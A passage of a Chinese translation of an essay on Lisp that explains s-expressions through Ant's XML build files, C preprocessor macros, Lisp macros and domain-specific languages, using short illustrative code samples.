<p>你可以注意一下最近Java和C#的变化(尤其是C#3.0的技术规范), C#把常用的功能抽象出来, 作为算符增加到C#中。C#新增加的query算符就是一个例子。它用的还是传统的作法:C#的设计者修改抽象语法树, 然后增加对应的实现。如果程序员自己也能修改抽象语法树该有多好! 那样我们就可以构造用于特定问题的子语言(比如说就像Ant这种用于构造项目的语言), 你能想到别的例子吗? 再思考一下这个概念。不过也不必思考太甚, 我们待会还会回到这个题目。那时候就会更加清晰。</p>
<h2 id="离Lisp越来越近"><a href="#离Lisp越来越近" class="headerlink" title="离Lisp越来越近"></a>离Lisp越来越近</h2><p>我们先把算符的事情放一放, 考虑一下Ant设计局限之外的东西。我早先说过, Ant可以通过写Java类来扩展。Ant解析器会根据名字来匹配XML元素和Java类, 一旦找到匹配, 就执行相应任务。为什么不用Ant自己来扩展Ant呢? 毕竟核心任务要包含很多传统语言的结构(例如”if”), 如果Ant自身就能提供构造任务的能力(而不是依赖java类), 我们就可以得到更高的移植性。我们将会依赖一组核心任务(如果你原意, 也不妨把它称作标准库), 而不用管有没有Java 环境了。这组核心任务可以用任何方式来实现, 而其他任务建筑在这组核心任务之上, 那样的话, Ant就会成为通用的, 可扩展的, 基于XML的编程语言。考虑下面这种代码的可能性:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;task name=&quot;Test&quot;&gt;</span><br><span class="line">	&lt;echo message=&quot;Hello World&quot;&gt;&lt;/echo&gt;</span><br><span class="line">&lt;/task&gt;</span><br><span class="line">&lt;test&gt;</span><br><span class="line">&lt;/test&gt;</span><br></pre></td></tr></table></figure>

<p>如果XML支持”task”的创建, 上面这段代码就会输出”Hello World!”. 实际上, 我们可以用Java写个”task”任务, 然后用Ant-XML来扩展它。Ant可以在简单原语的基础上写出更复杂的原语, 就像其他编程语言常用的作法一样。这也就是我们一开始提到的基于XML的编程语言。这样做用处不大(你知道为甚么吗?), 但是真的很酷。</p>
<p>再看一回我们刚才说的Task任务。祝贺你呀, 你在看Lisp代码!!! 我说什么? 一点都不像Lisp吗? 没关系, 我们再给它收拾一下。</p>
<h2 id="比XML更好"><a href="#比XML更好" class="headerlink" title="比XML更好"></a>比XML更好</h2><p>前面一节说过, Ant自我扩展没什么大用, 原因在于XML很烦琐。对于数据来说, 这个问题还不太大, 但如果代码很烦琐的话, 光是打字上的麻烦就足以抵消它的好处。你写过Ant的脚本吗? 我写过, 当脚本达到一定复杂度的时候, XML非常让人厌烦。想想看吧, 为了写结束标签, 每个词都得打两遍, 不发疯算好的!</p>
<p>为了解决这个问题, 我们应当简化写法。须知, XML仅仅是一种表达层次化数据的方式。我们并不是一定要使用尖括号才能得到树的序列化结果。我们完全可以采用其他的格式。其中的一种(刚好就是Lisp所采用的)格式, 叫做s表达式。s表达式要做的和XML一样, 但它的好处是写法更简单, 简单的写法更适合代码输入。后面我会详细讲s表达式。这之前我要清理一下XML的东西。考虑一下关于拷贝文件的例子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;copy todir=&quot;../new/dir&quot;&gt;</span><br><span class="line">	&lt;fileset dir=&quot;src_dir&quot;&gt;&lt;/fileset&gt;</span><br><span class="line">&lt;/copy&gt;</span><br></pre></td></tr></table></figure>

<p>想想看在内存里面, 这段代码的解析树在内存会是什么样子? 会有一个”copy”节点, 其下有一个 “fileset”节点, 但是属性在哪里呢? 它怎样表达呢? 如果你以前用过XML, 并且弄不清楚该用元素还是该用属性, 你不用感到孤单, 别人一样糊涂着呢。没人真的搞得清楚。这个选择与其说是基于技术的理由, 还不如说是闭着眼瞎摸。从概念上来讲, 属性也是一种元素, 任何属性能做的, 元素一样做得到。XML引入属性的理由, 其实就是为了让XML写法不那么冗长。比如我们看个例子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;copy&gt;</span><br><span class="line">	&lt;todir&gt;../new/dir&lt;/todir&gt;</span><br><span class="line">	&lt;fileset&gt;</span><br><span class="line">		&lt;dir&gt;src_dir&lt;/dir&gt;</span><br><span class="line">	&lt;/fileset&gt;</span><br><span class="line">&lt;/copy&gt;</span><br></pre></td></tr></table></figure>

<p>两下比较, 内容的信息量完全一样, 用属性可以减少打字数量。如果XML没有属性的话,光是打字就够把人搞疯掉。</p>
<p>说完了属性的问题, 我们再来看一看s表达式。之所以绕这么个弯, 是因为s表达式没有属性的概念。因为s表达式非常简练, 根本没有必要引入属性。我们在把XML转换成s表达式的时候, 心里应该记住这一点。看个例子, 上面的代码译成s表达式是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(copy</span><br><span class="line">(todir &quot;../new/dir&quot;)</span><br><span class="line">(fileset (dir &quot;src_dir&quot;)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>仔细看看这个例子, 差别在哪里? 尖括号改成了圆括号, 每个元素原来是有一对括号标记包围的, 现在取消了后一个(就是带斜杠的那个)括号标记。表示元素的结束只需要一个”)”就可以了。不错, 差别就是这些。这两种表达方式的转换, 非常自然, 也非常简单。s表达式打起字来, 也省事得多。第一次看s表达式(Lisp)时, 括号很烦人是吧? 现在我们明白了背后的道理, 一下子就变得容易多了。至少, 比XML要好的多。用s表达式写代码, 不单是实用, 而且也很让人愉快。s表达式具有XML的一切好处, 这些好处是我们刚刚探讨过的。现在我们看看更加Lisp风格的task例子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(task (name &quot;Test&quot;)</span><br><span class="line">(echo (message &quot;Hellow World!&quot;)))</span><br><span class="line">(Test)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用Lisp的行话来讲, s表达式称为表(list)。对于上面的例子, 如果我们写的时候不加换行, 用逗号来代替空格, 那么这个表达式看起来就非常像一个元素列表, 其中又嵌套着其他标记。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(task, (name, &quot;test&quot;), (echo, (message, &quot;Hello World!&quot;)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>XML自然也可以用这样的风格来写。当然上面这句并不是一般意义上的元素表。它实际上是一个树。这和XML的作用是一样的。称它为列表, 希望你不会感到迷惑, 因为嵌套表和树实际上是一码事。Lisp的字面意思就是表处理(list processing), 其实也可以称为树处理, 这和处理XML节点没有什么不同。</p>
<p>经受这一番折磨以后, 现在我们终于相当接近Lisp了, Lisp的括号的神秘本质(就像许多Lisp狂热分子认为的)逐渐显现出来。现在我们继续研究其他内容。</p>
<h2 id="重新审视C语言的宏"><a href="#重新审视C语言的宏" class="headerlink" title="重新审视C语言的宏"></a>重新审视C语言的宏</h2><p>到了这里, 对XML的讨论你大概都听累了, 我都讲累了。我们先停一停, 把树, s表达式,Ant这些东西先放一放, 我们来说说C的预处理器。一定有人问了, 我们的话题和C有什么关系? 我们已经知道了很多关于元编程的事情, 也探讨过专门写代码的代码。理解这问题有一定难度, 因为相关讨论文章所使用的编程语言, 都是你们不熟悉的。但是如果只论概念的话, 就相对要简单一些。我相信, 如果以C语言做例子来讨论元编程, 理解起来一定会容易得多。好, 我们接着看。</p>
<p>一个问题是, 为什么要用代码来写代码呢? 在实际的编程中, 怎样做到这一点呢? 到底元编程是什么意思? 你大概已经听说过这些问题的答案, 但是并不懂得其中缘由。为了揭示背后的真理, 我们来看一下一个简单的数据库查询问题。这种题目我们都做过。比方说,直接在程序码里到处写SQL语句来修改表(table)里的数据, 写多了就非常烦人。即便用C#3.0的LINQ, 仍然不减其痛苦。写一个完整的SQL查询(尽管语法很优美)来修改某人的地址, 或者查找某人的名字, 绝对是件令程序员倍感乏味的事情, 那么我们该怎样来解决这个问题? 答案就是: 使用数据访问层。</p>
<p>概念挺简单, 其要点是把数据访问的内容(至少是那些比较琐碎的部分)抽象出来, 用类来映射数据库的表, 然后用访问对象属性访问器(accessor)的办法来间接实现查询。这样就极大地简化了开发工作量。我们用访问对象的方法(或者属性赋值, 这要视你选用的语言而定)来代替写SQL查询语句。凡是用过这种方法的人, 都知道这很节省时间。当然, 如果你要亲自写这样一个抽象层, 那可是要花非常多的时间的–你要写一组类来映射表, 把属性访问转换为SQL查询, 这个活相当耗费精力。用手工来做显然是很不明智的。但是一旦你有了方案和模板, 实际上就没有多少东西需要思考的。你只需要按照同样的模板一次又一次重复编写相似代码就可以了。事实上很多人已经发现了更好的方法, 有一些工具可以帮助你连接数据库, 抓取数据库结构定义(schema), 按照预定义的或者用户定制的模板来自动编写代码。</p>
<p>如果你用过这种工具, 你肯定会对它的神奇效果深为折服。往往只需要鼠标点击数次, 就可以连接到数据库, 产生数据访问源码, 然后把文件加入到你的工程里面, 十几分钟的工作, 按照往常手工方式来作的话, 也许需要数百个小时人工(man-hours)才能完成。可是,如果你的数据库结构定义后来改变了怎么办? 那样的话, 你只需把这个过程重复一遍就可以了。甚至有一些工具能自动完成这项变动工作。你只要把它作为工程构造的一部分, 每次编译工程的时候, 数据库部分也会自动地重新构造。这真的太棒了。你要做的事情基本上减到了0。如果数据库结构定义发生了改变, 并在编译时自动更新了数据访问层的代码,那么程序中任何使用过时的旧代码的地方, 都会引发编译错误。</p>
<p>数据访问层是个很好的例子, 这样的例子还有好多。从GUI样板代码, WEB代码, COM和CORBA存根, 以及MFC和ATL等等。在这些地方, 都是有好多相似代码多次重复。既然这些代码有可能自动编写, 而程序员时间又远远比CPU时间昂贵, 当然就产生了好多工具来自动生成样板代码。这些工具的本质是什么呢? 它们实际上就是制造程序的程序。它们有一个神秘的名字, 叫做元编程。所谓元编程的本义, 就是如此。</p>
<p>元编程本来可以用到无数多的地方, 但实际上使用的次数却没有那么多。归根结底, 我们心里还是在盘算, 假设重复代码用拷贝粘贴的话, 大概要重复6,7次, 对于这样的工作量,值得专门建立一套生成工具吗? 当然不值得。数据访问层和COM存根往往需要重用数百次,甚至上千次, 所以用工具生成是最好的办法。而那些仅仅是重复几次十几次的代码, 是没有必要专门做工具的。不必要的时候也去开发代码生成工具, 那就显然过度估计了代码生成的好处。当然, 如果创建这类工具足够简单的话, 还是应当尽量多用, 因为这样做必然会节省时间。现在来看一下有没有合理的办法来达到这个目的。</p>
<p>现在, C预处理器要派上用场了。我们都用过C&#x2F;C++的预处理器, 我们用它执行简单的编译指令, 来产生简单的代码变换(比方说, 设置调试代码开关), 看一个例子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define triple(X) X+X+X</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这一行的作用是什么? 这是一个简单的预编译指令, 它把程序中的triple(X)替换称为X+X+X。例如, 把所有的triple(5)都换成5+5+5, 然后再交给编译器编译。这就是一个简单的代码生成的例子。要是C的预处理器再强大一点, 要是能够允许连接数据库, 要是能多一些其他简单的机制, 我们就可以在我们程序的内部开发自己的数据访问层。下面这个例子, 是一个假想的对C宏的扩展:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#get-db-schema(&quot;127.0.0.1&quot;)</span><br><span class="line">#iterate-through-tables</span><br><span class="line">#for-each-table</span><br><span class="line">class #table-name</span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br><span class="line">#end-for-each</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们连接数据库结构定义, 遍历数据表, 然后对每个表创建一个类, 只消几行代码就完成了这个工作。这样每次编译工程的时候, 这些类都会根据数据库的定义同步更新。显而易见, 我们不费吹灰之力就在程序内部建立了一个完整的数据访问层, 根本用不着任何外部工具。当然这种作法有一个缺点, 那就是我们得学习一套新的”编译时语言”, 另一个缺点就是根本不存在这么一个高级版的C预处理器。需要做复杂代码生成的时候, 这个语言(译者注: 这里指预处理指令, 即作者所说的”编译时语言”)本身也一定会变得相当复杂。它必须支持足够多的库和语言结构。比如说我们想要生成的代码要依赖某些ftp服务器上的文件, 预处理器就得支持ftp访问, 仅仅因为这个任务而不得不创造和学习一门新的语言,真是有点让人恶心(事实上已经存在着有此能力的语言, 这样做就更显荒谬)。我们不妨再灵活一点, 为什么不直接用 C&#x2F;C++自己作为自己的预处理语言呢?? 这样子的话, 我们可以发挥语言的强大能力, 要学的新东西也只不过是几个简单的指示字 , 这些指示字用来区别编译时代码和运行时代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">cout&lt;&lt;&quot;Enter a number: &quot;;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line">%&gt;</span><br><span class="line">for(int i=0;i&lt; &lt;% n %&gt;;i++)</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;&quot;hello&quot;&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>你明白了吗? 在&lt;%和%&gt;标记之间的代码是在编译时运行的, 标记之外的其他代码都是普通代码。编译程序时, 系统会提示你输入一个数, 这个数在后面的循环中会用到。而for循环的代码会被编译。假定你在编译时输入5, for循环的代码将会是:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(int i=0;i&lt;5; i++)</span><br><span class="line">&#123;</span><br><span class="line">    cout&lt;&lt;&quot;hello&quot;&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>又简单又有效率, 也不需要另外的预处理语言。我们可以在编译时就充分发挥宿主语言(此处是C&#x2F;C++)的强大能力, 我们可以很容易地在编译时连接数据库, 建立数据访问层, 就像JSP或者ASP创建网页那样。我们也用不着专门的窗口工具来另外建立工程。我们可以在代码中立即加入必要的工具。我们也用不着顾虑建立这种工具是不是值得, 因为这太容易了, 太简单了。这样子不知可以节省多少时间啊。</p>
<h2 id="你好-Lisp"><a href="#你好-Lisp" class="headerlink" title="你好, Lisp"></a>你好, Lisp</h2><p>到此刻为止, 我们所知的关于Lisp的指示可以总结为一句话: Lisp是一个可执行的语法更优美的XML, 但我们还没有说Lisp是怎样做到这一点的, 现在开始补上这个话题。</p>
<p>Lisp有丰富的内置数据类型, 其中的整数和字符串和其他语言没什么分别。像71或者”hello”这样的值, 含义也和C++或者Java这样的语言大体相同。真正有意思的三种类型是符号(symbol), 表和函数。这一章的剩余部分, 我都会用来介绍这几种类型, 还要介绍Lisp环境是怎样编译和运行源码的。这个过程用Lisp的术语来说通常叫做求值。通读这一节内容, 对于透彻理解元编程的真正潜力, 以及代码和数据的同一性, 和面向领域语言的观念, 都极其重要。万勿等闲视之。我会尽量讲得生动有趣一些, 也希望你能获得一些启发。那好, 我们先讲符号。</p>
<p>大体上, 符号相当于C++或Java语言中的标志符, 它的名字可以用来访问变量值(例如currentTime, arrayCount, n, 等等), 差别在于, Lisp中的符号更加基本。在C++或Java里面, 变量名只能用字母和下划线的组合, 而Lisp的符号则非常有包容性, 比如, 加号(+)就是一个合法的符号, 其他的像-, &#x3D;, hello-world, *等等都可以是符号名。符号名的命名规则可以在网上查到。你可以给这些符号任意赋值, 我们这里先用伪码来说明这一点。假定函数set是给变量赋值(就像等号&#x3D;在C++和Java里的作用), 下面是我们的例子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set(test, 5)            // 符号test的值为5</span><br><span class="line">set(=, 5)               // 符号=的值为5</span><br><span class="line">set(test, &quot;hello&quot;)      // 符号test的值为字符串&quot;hello&quot;</span><br><span class="line">set(test, =)            // 此时符号=的值为5, 所以test的也为5</span><br><span class="line">set(*, &quot;hello&quot;)         // 符号*的值为&quot;hello&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>好像有什么不对的地方? 假定我们对<em>赋给整数或者字符串值, 那做乘法时怎么办? 不管怎么说, <em>总是乘法呀? 答案简单极了。Lisp中函数的角色十分特殊, 函数也是一种数据类型, 就像整数和字符串一样, 因此可以把它赋值给符号。乘法函数Lisp的内置函数, 默认赋给</em>, 你可以把其他函数赋值给</em>, 那样*就不代表乘法了。你也可以把这函数的值存到另外的变量里。我们再用伪码来说明一下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(*,3,4)       // 3乘4, 结果是12</span><br><span class="line">set(temp, *)    // 把*的值, 也就是乘法函数, 赋值给temp</span><br><span class="line">set(*, 3)       // 把3赋予*</span><br><span class="line">*(3,4)          // 错误的表达式, *不再是乘法, 而是数值3</span><br><span class="line">temp(3,4)       // temp是乘法函数, 所以此表达式的值为3乘4等于12</span><br><span class="line">set(*, temp)    // 再次把乘法函数赋予*</span><br><span class="line">*(3,4)          // 3乘4等于12</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再古怪一点, 把减号的值赋给加号:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set(+, -)       // 减号(-)是内置的减法函数</span><br><span class="line">+(5, 4)         // 加号(+)现在是代表减法函数, 结果是5减4等于1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这只是举例子, 我还没有详细讲函数。Lisp中的函数是一种数据类型, 和整数, 字符串,符号等等一样。一个函数并不必然有一个名字, 这和C++或者Java语言的情形很不相同。在这里函数自己代表自己。事实上它是一个指向代码块的指针, 附带有一些其他信息(例如一组参数变量)。只有在把函数赋予其他符号时, 它才具有了名字, 就像把一个数值或字符串赋予变量一样的道理。你可以用一个内置的专门用于创建函数的函数来创建函数,然后把它赋值给符号fn, 用伪码来表示就是:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn [a]</span><br><span class="line">&#123;</span><br><span class="line">    return *(a, 2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这段代码返回一个具有一个参数的函数, 函数的功能是计算参数乘2的结果。这个函数还没有名字, 你可以把此函数赋值给别的符号:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set(times-two, fn [a] &#123;return *(a, 2)&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们现在可以这样调用这个函数:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">time-two(5)   // 返回10</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们先跳过符号和函数, 讲一讲表。什么是表? 你也许已经听过好多相关的说法。表, 一言以蔽之, 就是把类似XML那样的数据块, 用s表达式来表示。表用一对括号括住, 表中元素以空格分隔, 表可以嵌套。例如(这回我们用真正的Lisp语法, 注意用分号表示注释):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">()                      ; 空表</span><br><span class="line">(1)                     ; 含一个元素的表</span><br><span class="line">(1 &quot;test&quot;)              ; 两元素表, 一个元素是整数1, 另一个是字符串</span><br><span class="line">(test &quot;hello&quot;)          ; 两元素表, 一个元素是符号, 另一个是字符串</span><br><span class="line">(test (1 2) &quot;hello&quot;)    ; 三元素表, 一个符号test, 一个含有两个元素1和2的</span><br><span class="line">; 表, 最后一个元素是字符串</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当Lisp系统遇到这样的表时, 它所做的, 和Ant处理XML数据所做的, 非常相似, 那就是试图执行它们。其实, Lisp源码就是特定的一种表, 好比Ant源码是一种特定的XML一样。Lisp执行表的顺序是这样的, 表的第一个元素当作函数, 其他元素当作函数的参数。如果其中某个参数也是表, 那就按照同样的原则对这个表求值, 结果再传递给最初的函数作为参数。这就是基本原则。我们看一下真正的代码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(* 3 4)                 ; 相当于前面列举过的伪码*(3,4), 即计算3乘4</span><br><span class="line">(times-two 5)           ; 返回10, times-two按照前面的定义是求参数的2倍</span><br><span class="line">(3 4)                   ; 错误, 3不是函数</span><br><span class="line">(time-two)              ; 错误, times-two要求一个参数</span><br><span class="line">(times-two 3 4)         ; 错误, times-two只要求一个参数</span><br><span class="line">(set + -)               ; 把减法函数赋予符号+</span><br><span class="line">(+ 5 4)                 ; 依据上一句的结果, 此时+表示减法, 所以返回1</span><br><span class="line">(* 3 (+ 2 2))           ; 2+2的结果是4, 再乘3, 结果是12</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上述的例子中, 所有的表都是当作代码来处理的。怎样把表当作数据来处理呢? 同样的,设想一下, Ant是把XML数据当作自己的参数。在Lisp中, 我们给表加一个前缀’来表示数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(set test &#x27;(1 2))       ; test的值为两元素表</span><br><span class="line">(set test (1 2))        ; 错误, 1不是函数</span><br><span class="line">(set test &#x27;(* 3 4))     ; test的值是三元素表, 三个元素分别是*, 3, 4</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以用一个内置的函数head来返回表的第一个元素, tail函数来返回剩余元素组成的表。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(head &#x27;(* 3 4))         ; 返回符号*</span><br><span class="line">(tail &#x27;(* 3 4))         ; 返回表(3 4)</span><br><span class="line">(head (tal &#x27;(* 3 4)))   ; 返回3</span><br><span class="line">(head test)             ; 返回*</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>你可以把Lisp的内置函数想像成Ant的任务。差别在于, 我们不用在另外的语言中扩展Lisp(虽然完全可以做得到), 我们可以用Lisp自己来扩展自己, 就像上面举的times-two函数的例子。Lisp的内置函数集十分精简, 只包含了十分必要的部分。剩下的函数都是作为标准库来实现的。</p>
<h2 id="Lisp宏"><a href="#Lisp宏" class="headerlink" title="Lisp宏"></a>Lisp宏</h2><p>我们已经看到, 元编程在一个类似jsp的模板引擎方面的应用。我们通过简单的字符串处理来生成代码。但是我们可以做的更好。我们先提一个问题, 怎样写一个工具, 通过查找目录结构中的源文件来自动生成Ant脚本。</p>
<p>用字符串处理的方式生成Ant脚本是一种简单的方式。当然, 还有一种更加抽象, 表达能力更强, 扩展性更好的方式, 就是利用XML库在内存中直接生成XML节点, 这样的话内存中的节点就可以自动序列化成为字符串。不仅如此, 我们的工具还可以分析这些节点, 对已有的XML文件做变换。通过直接处理XML节点。我们可以超越字符串处理, 使用更高层次的概念, 因此我们的工作就会做的更快更好。</p>
<p>我们当然可以直接用Ant自身来处理XML变换和制作代码生成工具。或者我们也可以用Lisp来做这项工作。正像我们以前所知的, 表是Lisp内置的数据结构, Lisp含有大量的工具来快速有效的操作表(head和tail是最简单的两个)。而且, Lisp没有语义约束, 你可以构造任何数据结构, 只要你原意。</p>
<p>Lisp通过宏(macro)来做元编程。我们写一组宏来把任务列表(to-do list)转换为专用领域语言。</p>
<p>回想一下上面to-do list的例子, 其XML的数据格式是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;todo name=&quot;housework&quot;&gt;</span><br><span class="line">	&lt;item priority=&quot;high&quot;&gt;Clean the hose&lt;/item&gt;</span><br><span class="line">	&lt;item priority=&quot;medium&quot;&gt;Wash the dishes&lt;/item&gt;</span><br><span class="line">	&lt;item priority=&quot;medium&quot;&gt;Buy more soap&lt;/item&gt;</span><br><span class="line">&lt;/todo&gt;</span><br></pre></td></tr></table></figure>

<p>相应的s表达式是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(todo &quot;housework&quot;</span><br><span class="line">(item (priority high) &quot;Clean the house&quot;)</span><br><span class="line">(item (priority medium) &quot;Wash the dishes&quot;)</span><br><span class="line">(item (priority medium) &quot;Buy more soap&quot;))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>假设我们要写一个任务表的管理程序, 把任务表数据存到一组文件里, 当程序启动时, 从文件读取这些数据并显示给用户。在别的语言里(比如说Java), 这个任务该怎么做? 我们会解析XML文件, 从中得出任务表数据, 然后写代码遍历XML树, 再转换为Java的数据结构(老实讲, 在Java里解析XML真不是件轻松的事情), 最后再把数据展示给用户。现在如果用Lisp, 该怎么做?</p>
<p>假定要用同样思路的化, 我们大概会用Lisp库来解析XML。XML对我们来说就是一个Lisp的表(s表达式), 我们可以遍历这个表, 然后把相关数据提交给用户。可是, 既然我们用Lisp, 就根本没有必要再用XML格式保存数据, 直接用s表达式就好了, 这样就没有必要做转换了。我们也用不着专门的解析库, Lisp可以直接在内存里处理s表达式。注意, Lisp编译器和.net编译器一样, 对Lisp程序来说, 在运行时总是随时可用的。</p>
<p>但是还有更好的办法。我们甚至不用写表达式来存储数据, 我们可以写宏, 把数据当作代码来处理。那该怎么做呢? 真的简单。回想一下, Lisp的函数调用格式:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function-name arg1 arg2 arg3)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中每个参数都是s表达式, 求值以后, 传递给函数。如果我们用(+ 4 5)来代替arg1,那么, 程序会先求出结果, 就是9, 然后把9传递给函数。宏的工作方式和函数类似。主要的差别是, 宏的参数在代入时不求值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(macro-name (+ 4 5))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里, (+ 4 5)作为一个表传递给宏, 然后宏就可以任意处理这个表, 当然也可以对它求值。宏的返回值是一个表, 然后有程序作为代码来执行。宏所占的位置, 就被替换为这个结果代码。我们可以定义一个宏把数据替换为任意代码, 比方说, 替换为显示数据给用户的代码。</p>
<p>这和元编程, 以及我们要做的任务表程序有什么关系呢? 实际上, 编译器会替我们工作,调用相应的宏。我们所要做的, 仅仅是创建一个把数据转换为适当代码的宏。</p>
<p>例如, 上面曾经将过的C的求三次方的宏, 用Lisp来写是这样子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(defmacro triple (x)</span><br><span class="line">`(+ ~x ~x ~x))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>(译注: 在Common Lisp中, 此处的单引号应当是反单引号, 意思是对表不求值, 但可以对表中某元素求值, 记号~表示对元素x求值, 这个求值记号在Common Lisp中应当是逗号。反单引号和单引号的区别是, 单引号标识的表, 其中的元素都不求值。这里作者所用的记号是自己发明的一种Lisp方言Blaise, 和common lisp略有不同, 事实上, 发明方言是lisp高手独有的乐趣, 很多狂热分子都热衷这样做。比如Paul Graham就发明了ARC, 许多记号比传统的Lisp简洁得多, 显得比较现代)</p>
<p>单引号的用处是禁止对表求值。每次程序中出现triple的时候,</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(triple 4)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>都会被替换成:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(+ 4 4 4)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以为任务表程序写一个宏, 把任务数据转换为可执行码, 然后执行。假定我们的输出是在控制台:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(defmacro item (priority note)</span><br><span class="line">`(block</span><br><span class="line">(print stdout tab &quot;Prority: &quot; ~(head (tail priority)) endl)</span><br><span class="line">(print stdout tab &quot;Note: &quot; ~note endl endl)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们创造了一个非常小的有限的语言来管理嵌在Lisp中的任务表。这个语言只用来解决特定领域的问题, 通常称之为DSLs(特定领域语言, 或专用领域语言)。</p>
<h2 id="特定领域语言"><a href="#特定领域语言" class="headerlink" title="特定领域语言"></a>特定领域语言</h2><p>本文谈到了两个特定领域语言, 一个是Ant, 处理软件构造。一个是没起名字的, 用于处理任务表。两者的差别在于, Ant是用XML, XML解析器, 以及Java语言合在一起构造出来的。而我们的迷你语言则完全内嵌在Lisp中, 只消几分钟就做出来了。</p>
<p>我们已经说过了DSL的好处, 这也就是Ant用XML而不直接用Java的原因。如果使用Lisp,我们可以任意创建DSL, 只要我们需要。我们可以创建用于网站程序的DSL, 可以写多用户游戏, 做固定收益贸易(fixed income trade), 解决蛋白质折叠问题, 处理事务问题, 等等。我们可以把这些叠放在一起, 造出一个语言, 专门解决基于网络的贸易程序, 既有网络语言的优势, 又有贸易语言的好处。每天我们都会收获这种方法带给我们的益处, 远远超过Ant所能给予我们的。</p>
<p>用DSL解决问题, 做出的程序精简, 易于维护, 富有弹性。在Java里面, 我们可以用类来处理问题。这两种方法的差别在于, Lisp使我们达到了一个更高层次的抽象, 我们不再受语言解析器本身的限制, 比较一下用Java库直接写的构造脚本和用Ant写的构造脚本其间的差别。同样的, 比较一下你以前所做的工作, 你就会明白Lisp带来的好处。</p>
<h2 id="接下来"><a href="#接下来" class="headerlink" title="接下来"></a>接下来</h2><p>学习Lisp就像战争中争夺山头。尽管在电脑科学领域, Lisp已经算是一门古老的语言, 直到现在仍然很少有人真的明白该怎样给初学者讲授Lisp。尽管Lisp老手们尽了很大努力,今天新手学习Lisp仍然是困难重重。好在现在事情正在发生变化, Lisp的资源正在迅速增加, 随着时间推移, Lisp将会越来越受关注。</p>
<p>Lisp使人超越平庸, 走到前沿。学会Lisp意味着你能找到更好的工作, 因为聪明的雇主会被你与众不同的洞察力所打动。学会Lisp也可能意味着明天你可能会被解雇, 因为你总是强调, 如果公司所有软件都用Lisp写, 公司将会如何卓越, 而这些话你的同事会听烦的。Lisp值得努力学习吗? 那些已经学会Lisp的人都说值得, 当然, 这取决于你的判断。</p>
<h2 id="你的看法呢"><a href="#你的看法呢" class="headerlink" title="你的看法呢?"></a>你的看法呢?</h2><p>这篇文章写写停停, 用了几个月才最终完成。如果你觉得有趣, 或者有什么问题, 意见或建议, 请给我发邮件<a href="mailto:&#x63;&#111;&#x66;&#x66;&#101;&#101;&#x6d;&#x75;&#x67;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#x63;&#111;&#x66;&#x66;&#101;&#101;&#x6d;&#x75;&#x67;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;</a>, 我会很高兴收到你的反馈。</p>
<p>转自：<a href="http://blog.jobbole.com/30614/">http://blog.jobbole.com/30614/</a></p>
]]></content>
      <categories>
